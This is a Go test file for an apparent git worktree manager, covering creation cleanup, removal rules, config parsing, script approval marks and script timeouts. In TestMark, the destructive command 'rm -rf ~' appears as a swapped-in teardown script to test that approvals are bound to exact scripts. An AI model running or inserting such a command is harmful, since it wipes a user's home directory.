	f.write(f.repo, IncludeFile, "*.local\n")
	f.git(f.repo, "add", ".gitignore", IncludeFile)
	f.git(f.repo, "commit", "-q", "-m", "ignore")
	f.write(f.repo, "a.local", "0123456789")
	f.write(f.repo, "b.local", "0123456789")
	check := func(name string, ctx context.Context) {
		t.Helper()
		_, err := f.g.Create(ctx, CreateOptions{Source: f.repo, Root: f.root, Branch: name})
		if err == nil {
			t.Fatalf("%s: create succeeded", name)
		}
		if list, _ := f.g.List(context.Background(), f.repo); len(list) != 1 {
			t.Fatalf("%s: worktree left behind: %+v", name, list)
		}
		if f.g.refExists(context.Background(), f.repo, "refs/heads/"+name) {
			t.Fatalf("%s: branch left behind", name)
		}
	}
	defer func(n int, b int64) { MaxIncludeFiles, MaxIncludeBytes = n, b }(MaxIncludeFiles, MaxIncludeBytes)
	MaxIncludeFiles = 1
	check("files", context.Background())
	MaxIncludeFiles, MaxIncludeBytes = 10, 15
	check("bytes", context.Background())
	MaxIncludeBytes = 1 << 20

	// The deadline ends during the copy: a reader that cancels on its first read stands in for a
	// slow copy.
	ctx, cancel := context.WithCancel(context.Background())
	b := &copyBudget{ctx: ctx, files: 10, bytes: 1 << 20}
	cancel()
	dir := t.TempDir()
	root, err := os.OpenRoot(dir)
	if err != nil {
		t.Fatal(err)
	}
	defer root.Close()
	if _, err := copyOne(b, filepath.Join(f.repo, "a.local"), root, "a.local"); !errors.Is(err, context.Canceled) {
		t.Fatalf("copy after the deadline: %v", err)
	}
}

func TestIncludeFailureUndoes(t *testing.T) {
	if os.Geteuid() == 0 {
		t.Skip("root reads unreadable files")
	}
	f := newFixture(t)
	f.write(f.repo, ".gitignore", ".env\n")
	f.write(f.repo, IncludeFile, ".env\n")
	f.write(f.repo, ".env", "x\n")
	if err := os.Chmod(filepath.Join(f.repo, ".env"), 0); err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { os.Chmod(filepath.Join(f.repo, ".env"), 0o600) })
	_, err := f.create(CreateOptions{Branch: "undo"})
	if err == nil {
		t.Fatal("create succeeded with an unreadable include")
	}
	if list, _ := f.g.List(context.Background(), f.repo); len(list) != 1 {
		t.Fatalf("worktree left behind: %+v", list)
	}
	if f.g.refExists(context.Background(), f.repo, "refs/heads/undo") {
		t.Fatal("branch left behind")
	}
	if _, err := os.Lstat(filepath.Join(f.root, "app", "undo")); err == nil {
		t.Fatal("folder left behind")
	}
}

func TestRemove(t *testing.T) {
	f := newFixture(t)
	ctx := context.Background()
	c, err := f.create(CreateOptions{Branch: "rm"})
	if err != nil {
		t.Fatal(err)
	}
	p := c.Worktree.Path

	_, err = f.g.CheckRemove(ctx, f.repo, f.repo, true)
	mustKind(t, err, ErrInvalid) // the main working tree, even forced
	_, err = f.g.CheckRemove(ctx, f.repo, filepath.Join(f.root, "nope"), false)
	mustKind(t, err, ErrNotFound)

	// An untracked file blocks removal without force; so does a modified one.
	f.write(p, "new.txt", "work\n")
	_, err = f.g.CheckRemove(ctx, f.repo, p, false)
	mustKind(t, err, ErrConflict)
	os.Remove(filepath.Join(p, "new.txt"))
	f.write(p, "README", "changed\n")
	_, err = f.g.CheckRemove(ctx, f.repo, p, false)
	mustKind(t, err, ErrConflict)
	// Remove without force refuses a tree that changed after a clean check.
	f.git(p, "checkout", "--", "README")
	w, err := f.g.CheckRemove(ctx, f.repo, p, false)
	if err != nil {
		t.Fatal(err)
	}
	f.write(p, "late.txt", "x\n")
	mustKind(t, f.g.Remove(ctx, f.repo, w, false), ErrConflict)
	if _, err := os.Stat(filepath.Join(p, "late.txt")); err != nil {
		t.Fatal("refused removal lost a file")
	}
	// Force removes it; the branch stays.
	w, err = f.g.CheckRemove(ctx, f.repo, p, true)
	if err != nil {
		t.Fatal(err)
	}
	if err := f.g.Remove(ctx, f.repo, w, true); err != nil {
		t.Fatal(err)
	}
	if _, err := os.Stat(p); err == nil {
		t.Fatal("folder still there")
	}
	if !f.g.refExists(ctx, f.repo, "refs/heads/rm") {
		t.Fatal("the branch went with the worktree")
	}
	if list, _ := f.g.List(ctx, f.repo); len(list) != 1 {
		t.Fatalf("list %+v", list)
	}
}

func TestRemoveLockedAndGone(t *testing.T) {
	f := newFixture(t)
	ctx := context.Background()
	a, err := f.create(CreateOptions{Branch: "locked"})
	if err != nil {
		t.Fatal(err)
	}
	f.git(f.repo, "worktree", "lock", a.Worktree.Path)
	_, err = f.g.CheckRemove(ctx, f.repo, a.Worktree.Path, true)
	mustKind(t, err, ErrConflict)

	b, err := f.create(CreateOptions{Branch: "gone"})
	if err != nil {
		t.Fatal(err)
	}
	if err := os.RemoveAll(b.Worktree.Path); err != nil {
		t.Fatal(err)
	}
	// Another worktree whose folder is gone too, say on a volume not mounted now: removing one
	// entry leaves it listed.
	o, err := f.create(CreateOptions{Branch: "unmounted"})
	if err != nil {
		t.Fatal(err)
	}
	if err := os.RemoveAll(o.Worktree.Path); err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() {
		if _, err := f.g.Find(ctx, f.repo, o.Worktree.Path); err != nil {
			t.Error("removing one gone worktree pruned another")
		}
	})
	w, err := f.g.CheckRemove(ctx, f.repo, b.Worktree.Path, false)
	if err != nil {
		t.Fatal(err)
	}
	if err := f.g.Remove(ctx, f.repo, w, false); err != nil {
		t.Fatal(err)
	}
	if _, err := f.g.Find(ctx, f.repo, b.Worktree.Path); !errors.Is(err, ErrNotFound) {
		t.Fatalf("pruned worktree still listed: %v", err)
	}
}

func TestListDetached(t *testing.T) {
	f := newFixture(t)
	p := filepath.Join(f.root, "det")
	f.git(f.repo, "worktree", "add", "-q", "--detach", p)
	list, err := f.g.List(context.Background(), f.repo)
	if err != nil {
		t.Fatal(err)
	}
	if len(list) != 2 || list[1].Branch != "" || list[1].Head == "" || list[1].Main {
		t.Fatalf("list %+v", list)
	}
	if list[0].Branch != "main" || !list[0].Main {
		t.Fatalf("main %+v", list[0])
	}
}

func TestParseListBare(t *testing.T) {
	out := "worktree /r.git\nbare\n\nworktree /w\nHEAD 0123\nbranch refs/heads/x\nlocked reason\nprunable gitdir file points to non-existent location\n"
	list := parseList(out)
	if len(list) != 1 || list[0].Path != "/w" || list[0].Branch != "x" || !list[0].Locked || !list[0].Prunable || list[0].Main {
		t.Fatalf("list %+v", list)
	}
}

func TestConfig(t *testing.T) {
	dir := t.TempDir()
	if c, err := ReadConfig(dir); err != nil || c != (Config{}) {
		t.Fatalf("no file: %+v %v", c, err)
	}
	write := func(s string) {
		if err := os.WriteFile(filepath.Join(dir, ConfigFile), []byte(s), 0o644); err != nil {
			t.Fatal(err)
		}
	}
	write(`{"worktree": {"setup": "npm ci\n", "teardown": ["a", "b"]}, "scripts": {}}`)
	c, err := ReadConfig(dir)
	if err != nil || c.Setup != "npm ci" || c.Teardown != "a\nb" {
		t.Fatalf("config %+v %v", c, err)
	}
	write(`{"worktree": {"setup": 3}}`)
	if _, err := ReadConfig(dir); err == nil {
		t.Fatal("a number was accepted as a script")
	}
	write(`{`)
	if _, err := ReadConfig(dir); err == nil {
		t.Fatal("bad JSON was accepted")
	}
}

func TestMark(t *testing.T) {
	f := newFixture(t)
	ctx := context.Background()
	c, err := f.create(CreateOptions{Branch: "m"})
	if err != nil {
		t.Fatal(err)
	}
	if _, ok, err := f.g.ReadMark(ctx, c.Worktree.Path); ok || err != nil {
		t.Fatalf("mark before write: %v %v", ok, err)
	}
	m := Mark{Source: f.repo, Approved: true, Created: time.Unix(1700000000, 0).UTC()}
	if err := f.g.WriteMark(ctx, c.Worktree.Path, m); err != nil {
		t.Fatal(err)
	}
	got, ok, err := f.g.ReadMark(ctx, c.Worktree.Path)
	if err != nil || !ok || got.Source != m.Source || !got.Approved || !got.Created.Equal(m.Created) {
		t.Fatalf("mark %+v %v %v", got, ok, err)
	}
	// An approval covers exactly the scripts it was given.
	cfg := Config{Setup: "make", Teardown: "make clean"}
	ok2 := Mark{Approved: true, Digest: cfg.Digest()}
	if !ok2.Allows(cfg) || ok2.Allows(Config{Setup: "make", Teardown: "rm -rf ~"}) || (Mark{Digest: cfg.Digest()}).Allows(cfg) {
		t.Fatal("Allows does not bind the approval to the scripts")
	}
	// The mark is not in the working tree.
	if dirty, _ := f.g.Dirty(ctx, c.Worktree.Path); dirty {
		t.Fatal("the mark made the worktree dirty")
	}
}

func TestRunScript(t *testing.T) {
	dir := t.TempDir()
	code, out, err := RunScript(context.Background(), dir, "echo $GFF_BRANCH\npwd\nfalse\necho never", Env("/s", dir, "b1"))
	if err != nil || code != 1 {
		t.Fatalf("code %d err %v", code, err)
	}
	if !strings.HasPrefix(out, "b1\n") || strings.Contains(out, "never") {
		t.Fatalf("output %q", out)
	}
	code, out, err = RunScript(context.Background(), dir, "head -c 10000 /dev/zero | tr '\\0' x", nil)
	if err != nil || code != 0 || len(out) != maxTail {
		t.Fatalf("long output: code %d len %d err %v", code, len(out), err)
	}
	ctx, cancel := context.WithTimeout(context.Background(), 200*time.Millisecond)
	defer cancel()
	start := time.Now()
	code, _, err = RunScript(ctx, dir, "sleep 30", nil)
	if err == nil || code != -1 || time.Since(start) > 10*time.Second {
		t.Fatalf("timeout: code %d err %v after %v", code, err, time.Since(start))
	}
}

// TestRunScriptKillsChildren: at the deadline the script's background children end too.
func TestRunScriptKillsChildren(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("no process groups")
	}
	dir := t.TempDir()
	pidFile := filepath.Join(dir, "pid")
	ctx, cancel := context.WithTimeout(context.Background(), 500*time.Millisecond)
	defer cancel()
	RunScript(ctx, dir, `sleep 30 & echo $! > pid; wait`, nil)
	b, err := os.ReadFile(pidFile)
	if err != nil {
		t.Fatal(err)
	}
	pid, err := strconv.Atoi(strings.TrimSpace(string(b)))
	if err != nil {
		t.Fatal(err)
	}
	deadline := time.Now().Add(5 * time.Second)
	for syscall.Kill(pid, 0) == nil {
		if time.Now().After(deadline) {
			syscall.Kill(pid, syscall.SIGKILL)
			t.Fatal("the script's child outlived the deadline")
		}
		time.Sleep(20 * time.Millisecond)
	}
}

func TestSlug(t *testing.T) {
	for in, want := range map[string]string{"feature/Auth_2": "feature-auth-2", "--": "worktree", "a..b": "a-b", "wt/x-y": "wt-x-y"} {
		if got := Slug(in); got != want {
			t.Errorf("Slug(%q) = %q, want %q", in, got, want)
		}
	}
}
